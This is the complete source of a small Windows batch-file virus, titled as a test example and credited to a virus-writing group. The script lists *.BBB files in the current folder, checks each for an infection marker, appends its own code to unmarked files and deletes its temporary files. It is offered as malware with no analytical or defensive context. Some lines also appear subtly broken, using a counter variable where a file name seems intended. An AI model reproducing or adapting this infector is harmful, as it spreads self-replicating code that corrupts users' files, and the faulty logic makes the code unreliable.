Batch Test_Virus example.
Mod BATINF NO FOR & FIND infected. 
mod by SoTm/VXBL
________________________________________

:REM
COPY /A "%0" B$
SET F#=0
DIR %CD%\*.BBB /B /A>~.F
ECHO/END>>~.F
:F_
MORE +%F#% ~.F>-.F
SET /P F$=<-.F
IF %F$%'==END' GOTO F#
SET /P I=<%F$%
SET /A F#=%F#%+1
IF -%I%==-:REM GOTO F_
COPY B$+%F#%
MOVE B$ %F#%
GOTO F_
:F#
DEL ?$ ?.F
